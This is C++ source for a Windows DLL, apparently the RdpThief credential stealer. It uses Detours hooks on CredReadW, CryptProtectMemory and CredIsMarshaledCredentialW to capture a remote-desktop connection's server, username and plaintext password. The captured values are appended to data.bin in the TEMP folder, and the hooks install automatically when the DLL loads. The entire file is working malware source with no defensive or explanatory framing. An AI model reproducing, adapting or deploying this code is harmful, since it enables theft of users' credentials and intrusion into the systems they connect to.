// rdpthief_win.cpp : 定义 DLL 应用程序的导出函数。
//

#include "stdafx.h"
#include <Windows.h>
#include "detours.h"
#include <dpapi.h>
#include <wincred.h>
#include <strsafe.h>
#include <subauth.h>
#define SECURITY_WIN32 
#include <sspi.h>
#pragma comment(lib,"detours.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "Secur32.lib")


LPCWSTR lpTempPassword = NULL;
LPCWSTR lpUsername = NULL;
LPCWSTR lpServer = NULL;

VOID WriteCredentials() {
	const DWORD cbBuffer = 1024;
	TCHAR TempFolder[MAX_PATH];
	GetEnvironmentVariable(L"TEMP", TempFolder, MAX_PATH);
	TCHAR Path[MAX_PATH];
	StringCbPrintf(Path, MAX_PATH, L"%s\\data.bin", TempFolder);
	HANDLE hFile = CreateFile(Path, FILE_APPEND_DATA, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	WCHAR  DataBuffer[cbBuffer];
	memset(DataBuffer, 0x00, cbBuffer);
	DWORD dwBytesWritten = 0;
	StringCbPrintf(DataBuffer, cbBuffer, L"Server: %s\nUsername: %s\nPassword: %s\n\n", lpServer, lpUsername, lpTempPassword);
	WriteFile(hFile, DataBuffer, wcslen(DataBuffer) * 2, &dwBytesWritten, NULL);
	CloseHandle(hFile);

}


static BOOL(WINAPI *OriginalCredReadW)(LPCWSTR TargetName, DWORD Type, DWORD Flags, PCREDENTIALW *Credential) = CredReadW;
BOOL HookedCredReadW(LPCWSTR TargetName, DWORD Type, DWORD Flags, PCREDENTIALW *Credential)
{
	lpServer = TargetName;
	return OriginalCredReadW(TargetName, Type, Flags, Credential);
}



static DPAPI_IMP BOOL(WINAPI * OriginalCryptProtectMemory)(LPVOID pDataIn, DWORD  cbDataIn, DWORD  dwFlags) = CryptProtectMemory;

BOOL _CryptProtectMemory(LPVOID pDataIn, DWORD  cbDataIn, DWORD  dwFlags) {

	DWORD cbPass = 0;
	LPVOID lpPassword;
	int *ptr = (int *)pDataIn;
	LPVOID lpPasswordAddress = ptr + 0x1;
	memcpy_s(&cbPass, 4, pDataIn, 4);


	//When the password is empty it only counts the NULL byte.
	if (cbPass > 0x2) {
		SIZE_T written = 0;
		lpPassword = VirtualAlloc(NULL, 1024, MEM_COMMIT, PAGE_READWRITE);
		WriteProcessMemory(GetCurrentProcess(), lpPassword, lpPasswordAddress, cbPass, &written);
		lpTempPassword = (LPCWSTR)lpPassword;

	}

	return OriginalCryptProtectMemory(pDataIn, cbDataIn, dwFlags);
}


static BOOL(WINAPI * OriginalCredIsMarshaledCredentialW)(LPCWSTR MarshaledCredential) = CredIsMarshaledCredentialW;

BOOL _CredIsMarshaledCredentialW(LPCWSTR MarshaledCredential) {

	lpUsername = MarshaledCredential;
	if (wcslen(lpUsername) > 0) {

		WriteCredentials();
	}
	return OriginalCredIsMarshaledCredentialW(MarshaledCredential);
}


BOOL APIENTRY DllMain(HMODULE hModule, DWORD  dwReason, LPVOID lpReserved)
{
	if (DetourIsHelperProcess()) {
		return TRUE;
	}

	if (dwReason == DLL_PROCESS_ATTACH) {
		DetourRestoreAfterWith();
		DetourTransactionBegin();
		DetourUpdateThread(GetCurrentThread());
		DetourAttach(&(PVOID&)OriginalCryptProtectMemory, _CryptProtectMemory);
		DetourAttach(&(PVOID&)OriginalCredIsMarshaledCredentialW, _CredIsMarshaledCredentialW);
		DetourAttach(&(PVOID&)OriginalCredReadW, HookedCredReadW);

		DetourTransactionCommit();
	}
	else if (dwReason == DLL_PROCESS_DETACH) {
		DetourTransactionBegin();
		DetourUpdateThread(GetCurrentThread());
		DetourDetach(&(PVOID&)OriginalCryptProtectMemory, _CryptProtectMemory);
		DetourDetach(&(PVOID&)OriginalCredIsMarshaledCredentialW, _CredIsMarshaledCredentialW);
		DetourDetach(&(PVOID&)OriginalCredReadW, HookedCredReadW);
		DetourTransactionCommit();

	}
	return TRUE;
}

